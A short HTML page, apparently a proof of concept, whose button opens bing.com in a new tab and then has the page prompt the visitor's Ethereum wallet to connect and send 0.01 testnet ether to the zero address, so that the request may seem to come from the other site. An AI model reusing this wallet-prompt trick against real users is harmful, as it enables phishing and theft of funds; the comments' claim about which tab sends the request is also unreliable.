<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <center>
    <input type="button" class="button" value="From Original Site" onclick="openBingAndPerformTransaction()">
  </center>

  <script>
    async function openBingAndPerformTransaction() {
      // Open bing.com in a new tab
      const newTab = window.open('https://bing.com', 'x');

      // Wait for the new tab to load and handle the transaction
      newTab.onload = async function () {
        try {
          console.log('New tab loaded. Initiating wallet connection and transaction...');

          // Attempt wallet connection and transaction request simultaneously
          const walletPromise = promptWalletConnection();
          const transactionPromise = performTransaction();

          await Promise.all([walletPromise, transactionPromise]);

          console.log('Wallet connected and transaction sent successfully on the new tab!');
        } catch (error) {
          console.error('Wallet connection or transaction failed:', error);
        }
      };
    }

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          await ethereum.request({ method: 'eth_requestAccounts' });
        } catch (error) {
          throw new Error('Wallet connection request rejected by the user.');
        }
      } else {
        throw new Error('Web3 (Ethereum provider) is not available in this browser.');
      }
    }

    async function performTransaction() {
      const transactionParameters = {
        nonce: "0x00",
        gasPrice: "0x244AC6D",
        gas: "0x12A52",
        to: "0x0000000000000000000000000000000000000000",
        from: ethereum.selectedAddress,
        value: "0x2386F26FC10000",
        data: "0x00",
        chainId: "0x5", // Adjust this to the appropriate chain ID
      };

      try {
        const txHash = await ethereum.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });
        console.log(`Transaction sent! Transaction hash: ${txHash}`);
      } catch (error) {
        console.error(`Transaction failed: ${error.message}`);
      }
    }
  </script>
</body>
</html>
